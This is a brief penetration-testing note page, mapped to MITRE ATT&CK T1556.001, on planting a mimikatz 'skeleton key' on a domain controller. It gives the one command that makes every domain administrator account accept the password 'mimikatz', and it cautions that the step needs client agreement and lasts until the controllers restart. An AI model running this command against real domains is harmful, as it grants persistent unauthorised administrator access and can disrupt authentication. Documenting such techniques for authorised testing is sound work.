---
description: MITRE ATT&CK, Persistence, Sub-technique T1556.001
---

# Domain Controller Authentication

### Creating the Skeleton Key

```bash
mimikatz !misc::skeleton
```

This will allow you (by default) to log in with any domain administraotrs account using the password `mimikatz`

**Notes:** This should not be used unless explicitly discussed with a client. A skeleton key cannot be removed until the domain controllers impacted are restarted. Additionally, it is possible for this attack to cause unintended effects.
